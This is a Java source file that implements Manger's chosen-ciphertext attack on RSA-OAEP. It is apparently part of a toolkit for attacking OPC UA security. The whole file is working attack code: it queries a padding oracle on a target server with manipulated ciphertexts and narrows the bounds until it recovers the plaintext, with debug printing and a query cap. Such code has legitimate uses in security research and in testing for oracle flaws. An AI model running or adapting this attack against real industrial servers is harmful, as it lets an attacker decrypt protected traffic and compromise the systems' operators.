package attacks.manger;

import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import opcua.security.AsymCryptoUtility;

import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;

/**
 * Implementation of Manger's attack
 */
public class MangersAttack {
    private final Oracle oracle;
    private final BigInteger N;
    private final BigInteger e;
    private final BigInteger B;
    private final BigInteger c;

    /**
     * Constructor
     * @param cipherBlock Initial valid cipher block
     * @param oracle Oracle that is queried in the process
     * @param publicKey The public key of the target server
     */
    public MangersAttack(byte[] cipherBlock, Oracle oracle, RSAPublicKey publicKey) {
        this.oracle = oracle;
        this.N = publicKey.getModulus();
        this.e = publicKey.getPublicExponent();
        this.B = BigInteger.ONE.shiftLeft(N.bitLength() - 8);
        this.c = new BigInteger(1, cipherBlock);
    }

    public byte[] executeAttack() throws OracleException {

        //Step 1:
        BigInteger f1 = BigInteger.valueOf(2);                                          //1.1
        while(queryOracle(c, f1)) {                                                     //1.2
            f1 = f1.shiftLeft(1);                                                       //1.3a
        }

        //Step 2:
        BigInteger f2 = N.add(B).divide(B).multiply(f1.divide(BigInteger.valueOf(2)));  //2.1
        while(!queryOracle(c, f2)) {                                                    //2.2
            f2 = f2.add(f1.divide(BigInteger.valueOf(2)));                              //2.3a
        }

        //Step 3:
        BigInteger mmin = MangerUtility.divideCeiling(N, f2);                                //3.1
        BigInteger mmax = N.add(B).divide(f2);

        do {
            BigInteger ftmp = B.shiftLeft(1).divide(mmax.subtract(mmin));               //3.2
            BigInteger i = ftmp.multiply(mmin).divide(N);                               //3.3
            BigInteger f3 = MangerUtility.divideCeiling(i.multiply(N), mmin);                //3.4
            if (queryOracle(c, f3)) {
                mmax = i.multiply(N).add(B).divide(f3);                                 //3.5b
            } else {
                mmin = MangerUtility.divideCeiling(i.multiply(N).add(B), f3);                //3.5a
            }
        } while (mmax.compareTo(mmin) > 0);
        System.out.println(oracle.getQueryCount());
        byte[] b = AsymCryptoUtility.convertBigInteger(mmax, 256);
        System.out.println(mmax);
        return b;
    }

    private boolean queryOracle(BigInteger originalCipher, BigInteger manipulation) throws OracleException {
        if(oracle.getQueryCount() > 2*N.bitLength()) {
            throw new OracleException("Attack exceeded query limit");
        }
        BigInteger query = manipulation.modPow(e, N).multiply(originalCipher).mod(N);
        System.out.println(oracle.getQueryCount());
        return oracle.checkValidity(AsymCryptoUtility.convertBigInteger(query, N.bitLength() / 8));
    }
}
